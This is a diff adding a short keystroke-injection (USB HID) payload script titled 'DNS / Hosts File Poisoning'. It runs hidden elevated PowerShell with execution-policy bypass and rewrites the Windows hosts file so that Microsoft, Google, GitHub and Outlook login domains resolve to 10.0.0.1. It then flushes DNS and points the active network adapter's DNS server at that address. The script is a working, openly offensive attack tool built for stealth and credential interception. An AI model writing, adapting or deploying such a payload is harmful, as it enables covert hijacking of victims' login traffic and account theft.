@@ -1,0 +1,13 @@
+REM ============================================
+REM  FU PERSON | DNS / Hosts File Poisoning
+REM  FLLC - by PERSON FU
+REM  Time: ~10 seconds | Stealth: MEDIUM
+REM  Redirects domains via hosts file + DNS cache
+REM  Requires: Admin (UAC bypass attempt)
+REM ============================================
+DELAY 500
+GUI r
+DELAY 400
+STRING powershell -w hidden -ep bypass -c "Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList '-ep bypass -c \"$h=\\\"$env:SystemRoot\System32\drivers\etc\hosts\\\";$bk=$h+\\\".bak\\\";cp $h $bk -f;$entries=@(\\\"10.0.0.1 login.microsoftonline.com\\\",\\\"10.0.0.1 accounts.google.com\\\",\\\"10.0.0.1 github.com\\\",\\\"10.0.0.1 mail.google.com\\\",\\\"10.0.0.1 outlook.office365.com\\\");$c=gc $h;$entries|%{if($c -notcontains $_){Add-Content $h $_}};ipconfig /flushdns|Out-Null;Set-DnsClientServerAddress -InterfaceAlias (Get-NetAdapter|?{$_.Status -eq \\\"Up\\\"}|select -f 1).Name -ServerAddresses 10.0.0.1,8.8.8.8 2>$null\"'"
+ENTER
+DELAY 500
